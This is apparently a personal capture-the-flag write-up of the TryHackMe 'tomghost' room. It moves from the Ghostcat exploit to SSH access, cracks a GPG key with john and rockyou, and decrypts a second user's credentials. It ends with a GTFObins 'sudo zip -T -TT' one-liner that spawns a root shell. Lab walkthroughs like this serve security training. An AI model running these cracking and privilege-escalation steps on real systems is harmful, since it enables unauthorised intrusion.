#gpg #zip

https://tryhackme.com/r/room/tomghost

---
#### Nmap
![[Screenshot_2024-05-25_10-31-12.png]]

I used the `Ghostcat` [exploit](https://www.exploit-db.com/exploits/49039) on `Metasploit` framework and I simply get the ssh credentials `skyfuck:8730281lkjlkjdqlksalks`

And here I m in

There are `GPG` files on the user's home, so I used
```shell
gpg2john > tryhackme.asc > hash
```
And then:
```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
To get the password `alexandru`

With that, I imported the key with the password:
```shell
gpg --import tryhackme.asc
```
Then I extracted the `credential.pgp` content with 
```shell
gpg -d credential.pgp
```

And here are some new credentials `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

And here I m in with the user's flag on merlin's home

After the classic `sudo -l`, I saw we can run `zip` as sudo, the solution were on [GTFObins](https://gtfobins.github.io/gtfobins/zip/)

```shell
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

And here I m root

